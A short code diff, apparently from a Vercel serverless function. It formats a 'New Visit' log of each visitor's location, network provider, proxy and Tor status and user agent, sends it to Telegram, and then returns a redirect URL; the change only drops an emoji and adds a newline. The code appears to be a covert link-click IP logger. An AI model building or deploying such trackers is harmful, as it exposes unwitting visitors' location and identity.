@@ -32,7 +32,7 @@ ${flag} New Visit [Vercel]:
 🌎Location: ${data.country_name}, ${data.region}, ${data.city}
 🧨Provider: ${data.asn.name}
 💫Threat: Proxy: ${data.threat.is_proxy}, Tor: ${data.threat.is_tor}
-🎗User-Agent: ${userAgent}
+User-Agent: ${userAgent}
         `;
         
         // Отправляем лог в Telegram (асинхронно, не ждем ответа)
@@ -50,3 +50,4 @@ ${flag} New Visit [Vercel]:
     res.setHeader('Access-Control-Allow-Origin', '*');
     res.status(200).json({ redirectTo: REDIRECT_URL });
 }
+
